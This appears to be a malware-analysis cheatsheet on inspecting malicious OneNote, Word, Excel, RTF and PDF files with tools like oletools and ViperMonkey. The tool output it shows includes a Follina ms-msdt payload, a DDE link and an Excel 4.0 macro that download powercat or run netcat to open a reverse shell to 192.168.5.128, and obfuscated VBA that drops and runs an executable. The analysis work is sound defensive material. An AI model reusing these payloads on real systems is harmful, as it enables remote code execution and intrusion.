---
layout: article
title: "Cheatsheet: Malicious Document Analysis"
date: 2024-04-20
tags:
- Malware
---

# General

## What to look for in Maldoc analysis?

- URLs to download second payload such as fileless commands or executable
- Commands such as Powershell, Javascript, wscript, etc
- Filenames such as what it is downloaded and where it been downloaded
- Embedded file signatures such as PE header with MZ magic bytes
- Encoded file or commands

## Lab's OS

- Use Windows VM to emulate the maldoc
- Use REMNUX to analyze the maldoc in depth

# OneNote Analysis

Download the OneNoteAnalyzer from the release page in [GitHub](https://github.com/knight0x07/OneNoteAnalyzer/releases/tag/OneNoteAnalyzer).

Run `OneNoteAnalyzer.exe --file malware.one` then it will extract the malicious script from the OneNote file.

```
D:\OneNoteAnalyzer>OneNoteAnalyzer.exe --file "AgreementCancelation_395076(Feb08).one"

________                 _______          __            _____                .__
\_____  \   ____   ____  \      \   _____/  |_  ____   /  _  \   ____ _____  |  | ___.__.________ ___________
 /   |   \ /    \_/ __ \ /   |   \ /  _ \   __\/ __ \ /  /_\  \ /    \\__  \ |  |<   |  |\___   // __ \_  __ \
/    |    \   |  \  ___//    |    (  <_> )  | \  ___//    |    \   |  \/ __ \|  |_\___  | /    /\  ___/|  | \/
\_______  /___|  /\___  >____|__  /\____/|__|  \___  >____|__  /___|  (____  /____/ ____|/_____ \\___  >__|
        \/     \/     \/        \/                 \/        \/     \/     \/     \/           \/    \/
                                        Author: @knight0x07


[+] OneNote Document Path: AgreementCancelation_395076(Feb08).one
[+] OneNote Document File Format: OneNote2010
[+] Extracting Attachments from OneNote Document

      -> Extracted OneNote Document Attachments:

             -> Extracted Actual Attachment Path: Z:\build\one | FileName: Open.cmd | Size: 1426

      -> OneNote Document Attachments Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteAttachments

[+] Extracting Page MetaData from OneNote Document

       -> Page Count: 1
       -> Page MetaData:


       ---------------------------------------------

             -> Title:
             -> Author: admin
             -> CreationTime: 8/2/2023 8:54:29 AM
             -> LastModifiedTime: 8/2/2023 2:04:43 PM

       ---------------------------------------------


[+] Extracting Images from OneNote Document

      -> Extracted OneNote Document Images:

             -> Extracted Image FileName: 1_?????????? ???????.png | HyperLinkURL: Null
             -> Extracted Image FileName: 2_?????????? ???????.png | HyperLinkURL: Null

      -> Image Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteImages

[+] Extracting Text from OneNote Document

      -> Extracted OneNote Document Text:

             -> Page:  | Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteText\1_.txt

[+] Extracting HyperLinks from OneNote Document

      -> Extracted OneNote Document HyperLinks:  (Note: Text might contain hyperlink if no overlay)

             -> Page:

                 -> Text:
                 -> Text:

      -> HyperLink Extraction Path: \AgreementCancelation_395076(Feb08)_content\OneNoteHyperLinks\onenote_hyperlinks.txt

[+] Converting OneNote Document to Image

         -> Saved Path: \AgreementCancelation_395076(Feb08)_content\ConvertImage_AgreementCancelation_395076(Feb08).png
```

Reviewing the extract files, such as `OneNoteAttachments` folder... shows the batch file that contains a malicious payload.

# MS-MSDT scheme aka Follina Exploit

A sample shared by nao_sec that abusing ms-msdt to execute code. Refer [here](https://mobile.twitter.com/nao_sec/status/1530196847679401984).

Unzipping the documents, and navigate to `maldoc-name\word\_rels\document.xml.rels` will reveal the HTML URL which will execute their payload.

![image](https://user-images.githubusercontent.com/56353946/183518431-b8201056-19c3-4286-970f-67f51c3f8d93.png)

The payload might looks something like this:

```
<!doctype html>
    <html lang="en">
<body>
    <script>
    window.location.href = "ms-msdt:/id PCWDiagnostic /skip force /param \"IT_RebrowseForFile=cal?c IT_LaunchMethod=ContextMenu IT_SelectProgram=NotListed IT_BrowseForFile=h$(Start-Process('cmd'))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe IT_AutoTroubleshoot=ts_AUTO\"";
</script>
</body>
</html>
```

# RTF Exploit

RTF often comes with exploits targetting Microsoft Word vulnerabilities. Always look for embedded objects and anomalous content in the RTF.

Be prepared to locate, extract and analyze shellcode.
- Emulate using scdbg OR
- Execute using jmp2it OR
- Convert to executable and debug the executable using x32dbg
   - Find the start offset of the shellcode
- Behavioral analysis

RTF exploit list:
 - CVE-2018-8570 
 - CVE-2018-0802 
 - CVE-2017-11882 
 - CVE-2017-0199
 - CVE-2015-1641 
 - CVE-2014-1761 
 - CVE-2012-0158

## rtfobj

Use **rtfobj** to inspect and extract embedded objects from RTF files.

    remnux@remnux:~/Desktop$ rtfobj malicious.rtf
    rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools
    THIS IS WORK IN PROGRESS - Check updates regularly!
    Please report any issue at https://github.com/decalage2/oletools/issues
    
    ===============================================================================
    File: 'malicious.rtf' - size: 401748 bytes
    ---+----------+---------------------------------------------------------------
    id |index     |OLE Object                                                     
    ---+----------+---------------------------------------------------------------
    0  |0001076Ah |format_id: 2 (Embedded)                                        
       |          |class name: b'Package'                                         
       |          |data size: 159944                                              
       |          |OLE Package object:                                            
       |          |Filename: '8.t'                                                
       |          |Source path: 'C:\\Aaa\\tmp\\8.t'                               
       |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'   
       |          |MD5 = '9bffe424e9b7be9e1461a3218923e110'                       
    ---+----------+---------------------------------------------------------------
    1  |0005E98Ah |format_id: 2 (Embedded)                                        
       |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'             
       |          |data size: 6436                                                
       |          |MD5 = 'a09e82c26f94f3a9297377120503a678'                       
    ---+----------+---------------------------------------------------------------
    2  |0005E970h |Not a well-formed OLE object                                   
    ---+----------+---------------------------------------------------------------

To dump specific OLE Object:

    remnux@remnux:~/Desktop$ rtfobj malicious.rtf -s 2
    rtfobj 0.55 on Python 3.6.9 - http://decalage.info/python/oletools
    THIS IS WORK IN PROGRESS - Check updates regularly!
    Please report any issue at https://github.com/decalage2/oletools/issues
    
    
    ===============================================================================
    File: 'malicious.rtf' - size: 401748 bytes
    ---+----------+---------------------------------------------------------------
    id |index     |OLE Object                                                     
    ---+----------+---------------------------------------------------------------
    0  |0001076Ah |format_id: 2 (Embedded)                                        
       |          |class name: b'Package'                                         
       |          |data size: 159944                                              
       |          |OLE Package object:                                            
       |          |Filename: '8.t'                                                
       |          |Source path: 'C:\\Aaa\\tmp\\8.t'                               
       |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'   
       |          |MD5 = '9bffe424e9b7be9e1461a3218923e110'                       
    ---+----------+---------------------------------------------------------------
    1  |0005E98Ah |format_id: 2 (Embedded)                                        
       |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'             
       |          |data size: 6436                                                
       |          |MD5 = 'a09e82c26f94f3a9297377120503a678'                       
    ---+----------+---------------------------------------------------------------
    2  |0005E970h |Not a well-formed OLE object                                   
    ---+----------+---------------------------------------------------------------
    Saving raw data in object #0:
      saving object to file malicious.rtf_object_0005E970.raw
      md5 a3540560cf9b92c3bc4aa0ed52767b

## rtfdump.py

Alternatively, use rtfdump.py to analyze RTF. Below command list groups and structure of RTF.

    remnux@remnux:~/Desktop$ rtfdump.py mal.rtf 
        1 Level  1        c=  124 p=00000000 l=  401423 h=  349186;  319968 b=       0   u=    5079 \rtf1
        2  Level  2       c=  115 p=000000b7 l=    8126 h=     950;      20 b=       0   u=    1383 \fonttbl
        3   Level  3      c=    1 p=000000c0 l=      82 h=      23;      20 b=       0   u=      11 \f0
        4    Level  4     c=    0 p=000000e2 l=      31 h=      20;      20 b=       0   u=       0 \*\panose
        5   Level  3      c=    1 p=00000113 l=      72 h=      22;      20 b=       0   u=       4 \f1
    <---snip--->
      330  Level  2       c=    0 p=0000fab5 l=    3226 h=    3184;     252 b=       0 O u=       0 \*\datastore
          Name: 'Msxml2.SAXXMLReader.6.0\x00' Size: 1536 md5: 07ea196e1a0674f7ce220b6ae8c61cb7 magic: d0cf11e0
      331  Level  2       c=    2 p=00010750 l=  320007 h=  319968;  319968 b=       0 O u=       0 \object
          Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
      332   Level  3      c=    0 p=0001075f l=  319980 h=  319968;  319968 b=       0 O u=       0 \*\objdata
          Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
      333   Level  3      c=    0 p=0005e94c l=      10 h=       0;       0 b=       0   u=       0 \result
      334  Level  2       c=    1 p=0005e958 l=   14006 h=   13415;   13407 b=       0   u=       1 \object
      335   Level  3      c=    1 p=0005e967 l=   13979 h=   13415;   13407 b=       0   u=       0 \objdata
      336    Level  4     c=    1 p=0005e97f l=   13954 h=   13407;   13407 b=       0   u=       0 \*\objdata
      337     Level  5    c=    0 p=0005e98b l=     534 h=     279;     279 b=       0   u=       0 \ods0000000000000000000000000000000000000000000010034533010342038422221556620832358404453773117665770487510150778730755613138068475808657687162582054482186656468762876881030061344325218221648318281400000000000000000000000000000000000000000000000000000000
      338 Remainder       c=    0 p=00062010 l=     324 h=       0;       0 b=       0   u=     324 
          Only NULL bytes = 324

To reduce the output but filtering for the entries that potentially contain the embedded objects, we can use-f O.

    remnux@remnux:~/Desktop$ rtfdump.py mal.rtf -f O
      330  Level  2       c=    0 p=0000fab5 l=    3226 h=    3184;     252 b=       0 O u=       0 \*\datastore
          Name: 'Msxml2.SAXXMLReader.6.0\x00' Size: 1536 md5: 07ea196e1a0674f7ce220b6ae8c61cb7 magic: d0cf11e0
      331  Level  2       c=    2 p=00010750 l=  320007 h=  319968;  319968 b=       0 O u=       0 \object
          Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e
      332   Level  3      c=    0 p=0001075f l=  319980 h=  319968;  319968 b=       0 O u=       0 \*\objdata
          Name: 'Package\x00' Size: 159944 md5: 64081623857787fa13f24d59991d76f5 magic: 0200382e

To dump specific group:

    rtfdump.py mal.rtf -s 330 -H -d > output.bin

If you're likely encountring RoyalRoad RTF, picture below show Royal Road exploit kit version pattern:

![enter image description here](https://nao-sec.org/assets/2020-01-30/version.png)
Source: [An Overhead View of the Royal Road | @nao_sec (nao-sec.org)](https://nao-sec.org/2020/01/an-overhead-view-of-the-royal-road.html)

Also, we can use YARA rules made by NaoSec for RoyalRoad:
[RoyalRoad YARA rules](https://github.com/nao-sec/yara_rules)

# RTF template injection
Search for control word `\*\template`. Most attacker will serve the RTF template in this control word. For example:

![image](https://user-images.githubusercontent.com/56353946/123367279-442fb300-d5ac-11eb-9794-bb39c8ac0232.png)

# CVE 2021 40444
Initial assesment is to check `\word\_rels\document.xml.rels`

# DOCX Template injection
Reside in `word/_rels/settings.xml.rels` 

# Macro attack

## Interesting VBA Functions/Code

1. `AutoOpen()`
2. `AutoExec()`
3. `AutoClose()`
4. `Chr()`
5. `Shell()`
6. `Private Declare Function WINAPIFUNC Lib DLLNAME`

## oleid

Oleid are use to analyze characteristics of the document.

```
remnux@siftworkstation: ~/Work
$ oleid baddoc.doc 
oleid 0.54 - http://decalage.info/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Filename: baddoc.doc
 Indicator                      Value                    
 OLE format                     True                     
 Has SummaryInformation stream  True                     
 Application name               b'Microsoft Office Word' 
 Encrypted                      False                    
 Word Document                  True                     
 VBA Macros                     True                     
 Excel Workbook                 False                    
 PowerPoint Presentation        False                    
 Visio Drawing                  False                    
 ObjectPool                     False                    
 Flash objects                  0
```

## oletimes

Determine the times of modification and creation time of stream in document

```
remnux@siftworkstation: ~/Work
$ oletimes baddoc.doc 
oletimes 0.54 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues
===============================================================================
FILE: baddoc.doc

+----------------------------+---------------------+---------------------+
| Stream/Storage name        | Modification Time   | Creation Time       |
+----------------------------+---------------------+---------------------+
| Root                       | 2015-02-10 15:27:52 | None                |
| '\x01CompObj'              | None                | None                |
| '\x05DocumentSummaryInform | None                | None                |
| ation'                     |                     |                     |
| '\x05SummaryInformation'   | None                | None                |
| '1Table'                   | None                | None                |
| 'Macros'                   | 2015-02-10 15:27:52 | 2015-02-10 15:27:52 |
| 'Macros/PROJECT'           | None                | None                |
| 'Macros/PROJECTwm'         | None                | None                |
| 'Macros/UserForm1'         | 2015-02-10 15:27:52 | 2015-02-10 15:27:52 |
| 'Macros/UserForm1/\x01Comp | None                | None                |
| Obj'                       |                     |                     |
| 'Macros/UserForm1/\x03VBFr | None                | None                |
| ame'                       |                     |                     |
| 'Macros/UserForm1/f'       | None                | None                |
| 'Macros/UserForm1/o'       | None                | None                |
| 'Macros/VBA'               | 2015-02-10 15:27:52 | 2015-02-10 15:27:52 |
| 'Macros/VBA/ThisDocument'  | None                | None                |
| 'Macros/VBA/UserForm1'     | None                | None                |
| 'Macros/VBA/_VBA_PROJECT'  | None                | None                |
| 'Macros/VBA/dir'           | None                | None                |
| 'WordDocument'             | None                | None                |
+----------------------------+---------------------+---------------------+
```

## oledump

Use **oledump** to analyze and extract OLE files

`oledump.py filename.doc` = Generally analyze streams that contain macro

```
remnux@remnux:~/Desktop$ oledump.py macro-sample.xls 
1:       107 '\x01CompObj'
2:       244 '\x05DocumentSummaryInformation'
3:       200 '\x05SummaryInformation'
4:     14882 'Workbook'
5:       740 '_VBA_PROJECT_CUR/PROJECT'
6:       182 '_VBA_PROJECT_CUR/PROJECTwm'
7:        97 '_VBA_PROJECT_CUR/UserForm1/\x01CompObj'
8:       293 '_VBA_PROJECT_CUR/UserForm1/\x03VBFrame'
9:       187 '_VBA_PROJECT_CUR/UserForm1/f'
10:    443812 '_VBA_PROJECT_CUR/UserForm1/o'
11: M    2423 '_VBA_PROJECT_CUR/VBA/Module1'
12: M    3251 '_VBA_PROJECT_CUR/VBA/Module2'
13: m     977 '_VBA_PROJECT_CUR/VBA/Sheet1'
14: m     977 '_VBA_PROJECT_CUR/VBA/Sheet2'
15: m     977 '_VBA_PROJECT_CUR/VBA/Sheet3'
16: M    1275 '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
17: M    1907 '_VBA_PROJECT_CUR/VBA/UserForm1'
18:      4402 '_VBA_PROJECT_CUR/VBA/_VBA_PROJECT'
19:       926 '_VBA_PROJECT_CUR/VBA/dir'
```

`oledump.py filename.xls -s 11 -v` = Extract macro for the stream 11 for example

```
remnux@remnux:~/Desktop$ oledump.py macro-sample.xls -s 16 -v
Attribute VB_Name = "ThisWorkbook"
Attribute VB_Base = "0{00020819-0000-0000-C000-000000000046}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = True
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = True
Private Sub Workbook_Open()
  Call userAldiLoadr
  Sheet3.Visible = xlSheetVisible
 Sheet3.Copy
 End Sub
```

## olevba3
Use **olevba3** to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to extract VBA Macro code in clear text, deobfuscate and analyze malicious macros

### General scanning
```
remnux@remnux:~/Desktop$ olevba3 macro-sample.xls
olevba 0.55.1 on Python 3.6.9 - http://decalage.info/python/oletools
===============================================================================
FILE: macro-sample.xls
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: macro-sample.xls - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Workbook_Open()
  Call userAldiLoadr
  Sheet3.Visible = xlSheetVisible
 Sheet3.Copy
 End Sub
<---snip--->
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|AutoExec  |TextBox1_Change     |Runs when the file is opened and ActiveX     |
|          |                    |objects trigger events                       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Put                 |May write to a file (if combined with Open)  |
|Suspicious|Binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalNoFocus     |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|MkDir               |May create a directory                       |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Shell.Application   |May run an application (if combined with     |
|          |                    |CreateObject)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+
```

### Extract VBA
```
nux@siftworkstation: ~/Work
$ olevba3 -c baddoc.doc > out.vba
```

### Deobfuscate strings
```
remnux@siftworkstation: ~/Work
$ olevba3 --deobf baddoc.doc 
olevba 0.56.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: baddoc.doc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: baddoc.doc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
    h
End Sub
<--snip-->
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|AutoExec  |Workbook_Open       |Runs when the Excel Workbook is opened       |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
<---snip--->
|VBA string|$down.DownloadFile($|"$d" + "o" & Chr(Asc("w")) + "n" & "." &     |
|          |url,$file);         |Chr(68) & "ow" & "nloa" & "dFi" & "le($u" &  |
|          |                    |"rl,$" & "file);"                            |
|VBA string|\AppData\Local\Temp\|"\AppData\Local\Temp\" + "444.e" &           |
|          |444.exe';           |Chr(Asc("x")) + "e" & "';"                   |
|VBA string|'+'.'+'v'+'bs';     |Chr(39) + Chr(43) + Chr(39) + "." + Chr(39) +|
|          |                    |Chr(43) + Chr(39) + "v" + Chr(39) + Chr(43) +|
|          |                    |Chr(39) + "bs" + Chr(39) + ";"               |
|VBA string|$batFilePath =      |"$b" + "a" + "tFilePath = 'c:\Users\"        |
|          |'c:\Users\          |                                             |
|VBA string|'+'.'+'b'+'at';     |Chr(39) + Chr(43) + Chr(39) + "." + Chr(39) +|
|          |                    |Chr(43) + Chr(39) + "b" + Chr(39) + Chr(43) +|
|          |                    |Chr(39) + "at" + Chr(39) + ";"               |
|VBA string|$psFilePath =       |"$p" + "sFilePath = 'c:\Users\"              |
|          |'c:\Users\          |                                             |
|VBA string|'+'.'+'p'+'s1';     |Chr(39) + Chr(43) + Chr(39) + "." + Chr(39) +|
|          |                    |Chr(43) + Chr(39) + "p" + Chr(39) + Chr(43) +|
|          |                    |Chr(39) + "s1" + Chr(39) + ";"               |
|VBA string|cmd.exe /c          |"c" & Chr(109) & "d.e" & Chr(120) & "e /c    |
|          |'c:\Users\          |'c:\Users\"                                  |
|          |ect("""&S"          |& "re" & "at" & "eO" & "b" & "je" & "ct(" &  |
|          |                    |Chr(34) & Chr(34) & Chr(34) & "&" & "S" &    |
|          |                    |Chr(34)                                      |
|VBA string|&"cripting.FileSyste|("&") & Chr(34) & "cr" & "ipt" & "ing.F" &   |
|          |mObject")           |"ileS" & "ystem" & "Ob" & "ject" & Chr(34) & |
|          |                    |")"                                          |
|VBA string|currentFile =       |"cur" + "rent" + Chr(Asc("F")) + "ile = " &  |
|          |"C:\Users\          |Chr(34) & "C:\" & Chr(Asc("U")) & "sers\"    |
|VBA string|\AppData\Local\Temp\|"\AppData\Local\Temp" + "\"                  |
|VBA string|"&"."&"p"&"s1"      |Chr(34) + "&" + Chr(34) + "." + Chr(34) + "&"|
|          |                    |+ Chr(34) + "p" + Chr(34) + "&" + Chr(34) +  |
|          |                    |"s1" + Chr(34)                               |
|VBA string|Set objShell =      |"" & Chr(83) & "et " & Chr(111) & "bj" &     |
|          |                    |Chr(83) & "he" + Chr(Asc("l")) +             |
|          |                    |Chr(Asc("l")) + " = "                        |
|VBA string|reateObject("Wscript|"reate" & Chr(79) & Chr(98) & "ject(" &      |
|          |.shell")            |Chr(34) & "W" & Chr(115) & "cript." &        |
|          |                    |Chr(115) & "hell" & Chr(34) & ")" + ""       |
|VBA string|objShell.Run        |"" & Chr(111) & "bj" & Chr(83) & "hell" &    |
|          |"powerS"+"hell.exe  |Chr(46) & Chr(82) & "un " & Chr(34) & "p" &  |
|          |-noexit             |Chr(111) & "wer" & Chr(83) + Chr(34) + "+" + |
|          |-ExecutionPolicy    |Chr(34) & "hell.e" & Chr(120) & "e -n" &     |
|          |bypass -noprofile   |Chr(111) & "exit -Exe" & "cutionP" & Chr(111)|
|          |-file " &           |& "licy" & " byp" & "ass -n" & Chr(111) &    |
|          |currentFile,0,true  |"pr" & Chr(111) & "file -file " & Chr(34) & "|
|          |                    |& currentFile,0,true"                        |
|VBA string|ping 1.1.2.2 -n 2   |"ping 1.1.2.2 -n" & " 2"                     |
|VBA string|set Var1="."        |"set Var1=" + Chr(34) + "." + Chr(34)        |
|VBA string|set Var2="v"        |"set Var2=" + Chr(34) + "v" + Chr(34)        |
|VBA string|set Var3="bs"       |"set Var3=" + Chr(34) + "bs" + Chr(34)       |
|VBA string|set Var4="c:\Users\ |"set Var4=" + Chr(34) & "c:\Users\"          |
|VBA string|cscript.exe %Var4%%V|"c" & "sc" & "ri" & "pt" & Chr(46) + Chr(101)|
|          |ar1%%Var2%%Var3%    |& Chr(120) & "e " & "%Var4%" +               |
|          |                    |"%Var1%%Var2%%Var3%"                         |
+----------+--------------------+---------------------------------------------+
```

### Auto decode the obfuscated VBA
```
remnux@siftworkstation: ~/Work
$ olevba3 --deobf --reveal baddoc.doc 
```

## mraptor

**mraptor** is a tool designed to detect most malicious VBA Macros using generic heuristics.
```
remnux@remnux:~/Desktop$ mraptor -m macro-sample.xls 
MacroRaptor 0.55 - http://decalage.info/python/oletools
This is work in progress, please report issues at https://github.com/decalage2/oletools/issues
----------+-----+----+--------------------------------------------------------
Result    |Flags|Type|File                                                    
----------+-----+----+--------------------------------------------------------
SUSPICIOUS|AWX  |OLE:|macro-sample.xls                                        
          |     |    |Matches: ['Workbook_Open', 'MkDir', 'CreateObject']     

Flags: A=AutoExec, W=Write, X=Execute
Exit code: 20 - SUSPICIOUS
```

## ViperMonkey
Use **ViperMonkey** to emulate the VBA. Vmonkey is a VBA Emulation engine written in Python, designed to analyze and deobfuscate malicious VBA Macros contained in Microsoft Office files.

```
remnux@remnux:~/Desktop$ vmonkey macro-sample.xls
 ____ __  _____ 
| |  / (_)___  ___  _____/  |/  /___  ____  / /_____  __  __
| | / / / __ \/ _ \/ ___/ /|_/ / __ \/ __ \/ //_/ _ \/ / / /
| |/ / / /_/ /  __/ /  / /  / / /_/ / / / / ,< /  __/ /_/ / 
|___/_/ .___/\___/_/  /_/  /_/\____/_/ /_/_/|_|\___/\__, /  
 /_/   /____/   
vmonkey 0.08 - https://github.com/decalage2/ViperMonkey
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/ViperMonkey/issues

===============================================================================
FILE: macro-sample.xls
INFO Starting emulation...
INFO Emulating an Office (VBA) file.
INFO Reading document metadata...
Traceback (most recent call last):
  File "/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py", line 15, in <module>
from unotools import Socket, connect
ModuleNotFoundError: No module named 'unotools'
ERRORRunning export_all_excel_sheets.py failed. Command '['python3', '/opt/vipermonkey/src/vipermonkey/vipermonkey/export_all_excel_sheets.py', '/tmp/tmp_excel_file_3189461446']' returned non-zero exit status 1
INFO Saving dropped analysis artifacts in .//macro-sample.xls_artifacts/
INFO Parsing VB...
Error: [Errno 2] No such file or directory: ''.
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file:  - OLE stream: u'_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Private Sub Workbook_Open()
  Call userAldiLoadr
  Sheet3.Visible = xlSheetVisible
 Sheet3.Copy
 End Sub

-------------------------------------------------------------------------------
PARSING VBA CODE:
INFO parsed Sub Workbook_Open (): 3 statement(s)
<---snip--->
-------------------------------------------------------------------------------
PARSING VBA CODE:
INFO parsed Sub Mace5 (): 2 statement(s)
INFO parsed Sub Maceo8 (): 2 statement(s)
INFO parsed Sub unAldizip ([ByRef Fname as Variant, ByRef FileNameFolder as Variant]): 4 statement(s)
-------------------------------------------------------------------------------
VBA MACRO Module2.bas 
in file:  - OLE stream: u'_VBA_PROJECT_CUR/VBA/Module2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
-------------------------------------------------------------------------------
VBA CODE (with long lines collapsed):
Sub userAldiLoadr()

Dim path_Aldi_file As String
Dim file_Aldi_name  As String
Dim zip_Aldi_file  As Variant
Dim fldr_Aldi_name  As Variant

Dim byt() As Byte

Dim ar1Aldi() As String

file_Aldi_name = "dhrwarhsav"

fldr_Aldi_name = Environ$("ALLUSERSPROFILE") & "\Edlacar\"
```

## VBA Debugging
In Microsoft Office, press `Alt + F11` to view Macro code.

![image](https://github.com/fareedfauzi/fareedfauzi.github.io/assets/56353946/1ee1c03b-946d-47cf-944e-8cc1802a770e)

Breakpoint on the code, usually on entry point of the code -> run the VBA -> Watch local variable

# VBA stomping (if macro was destroyed)
Use pcodedmp to disassemble p-code macro code from filename.doc
```
remnux@remnux:~/Desktop$ pcodedmp macro-sample.xls -d
Processing file: macro-sample.xls
===============================================================================
Module streams:
_VBA_PROJECT_CUR/VBA/ThisWorkbook - 1275 bytes
Line #0:
FuncDefn (Private Sub Workbook_Open())
Line #1:
ArgsCall (Call) userAldiLoadr 0x0000 
Line #2:
Ld xlSheetVisible 
Ld Sheet3 
<---snip--->
Line #4:
Ld xl3DAreaStacked 
MemStWith LineStyle 
Line #5:
Line #6:
EndWith 
Line #7:
Line #8:
StartWithExpr 
Ld xlEdgeRight 
Ld Selection 
ArgsMemLd Borders 0x0001
<---snip--->
Line #20:
FuncDefn (Sub Maceo8())
```

# DDE attack
Use **msodde** to detect and extract DDE/DDEAUTO links from MS Office documents, RTF and CSV

```
remnux@remnux:~/Desktop$ msodde DDE-attack.docx 
msodde 0.55 - http://decalage.info/python/oletools
THIS IS WORK IN PROGRESS - Check updates regularly!
Please report any issue at https://github.com/decalage2/oletools/issues

Opening file: DDE-attack.docx
DDE Links:
 DDEAUTO c:\\windows\\system32\\cmd.exe "/k powershell -c IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.5.128/powercat.ps1');powercat -c 192.168.5.128 -p 1111 -e cmd
```

# Excel 4.0 macros
**XLMMacroDeobfuscator** can be used to extract or decode obfuscated XLM macros (also known as Excel 4.0 macros)

Extract: `xlmdeobfuscator -f Book1.xlsm -x`

Extract, emulate and deobfuscate: `xlmdeobfuscator -f Book1.xlsm`

```
remnux@remnux:~/Desktop$ xlmdeobfuscator -f excel4macro.xls 
pywin32 is not installed (only is required if you want to use MS Excel)

|\     /|( \      (       )
( \   / )| (      | () () |
 \ (_) / | |      | || || |
  ) _ (  | |      | |(_)| |
 / ( ) \ | |      | |   | |
( /   \ )| (____/\| )   ( |
|/     \|(_______/|/     \|
   ______   _______  _______  ______   _______           _______  _______  _______ _________ _______  _______
  (  __  \ (  ____ \(  ___  )(  ___ \ (  ____ \|\     /|(  ____ \(  ____ \(  ___  )\__   __/(  ___  )(  ____ )
  | (  \  )| (    \/| (   ) || (   ) )| (    \/| )   ( || (    \/| (    \/| (   ) |   ) (   | (   ) || (    )|
  | |   ) || (__    | |   | || (__/ / | (__    | |   | || (_____ | |      | (___) |   | |   | |   | || (____)|
  | |   | ||  __)   | |   | ||  __ (  |  __)   | |   | |(_____  )| |      |  ___  |   | |   | |   | ||     __)
  | |   ) || (      | |   | || (  \ \ | (      | |   | |      ) || |      | (   ) |   | |   | |   | || (\ (
  | (__/  )| (____/\| (___) || )___) )| )      | (___) |/\____) || (____/\| )   ( |   | |   | (___) || ) \ \__
  (______/ (_______/(_______)|/ \___/ |/       (_______)\_______)(_______/|/     \|   )_(   (_______)|/   \__/


XLMMacroDeobfuscator(v 0.1.4) - https://github.com/DissectMalware/XLMMacroDeobfuscator

File: /home/remnux/Desktop/excel4macro.xls

Unencrypted xls file

[Loading Cells]
[Starting Deobfuscation]
There is no entry point, please specify a cell address to start
Example: Sheet1!A1
Macro1!A1
CELL:A1, PartialEvaluation   , EXEC("nc -nv 192.168.5.128 1111 -e cmd.exe")
CELL:A2, PartialEvaluation   , RETURN()
[END of Deobfuscation]
time elapsed: 5.66940808296203
```

# PDF Analysis
## Interesting PDF keywords
1. /OpenAction
2. /AA
3. /Javascript
4. /JS
5. /Names
6. /EmbeddedFile
7. /URI
8. /SubmitForm
9. /Launch
10. /ASCIIHexDecode
11. /LZWDecode
12. /FlateDecode
13. /ASCII85Decode
14. /Crypt

## pdfid.py
```
remnux@siftworkstation: ~/Work
$ pdfid.py badpdf.pdf 
PDFiD 0.2.1 badpdf.pdf
 PDF Header: %PDF-1.3
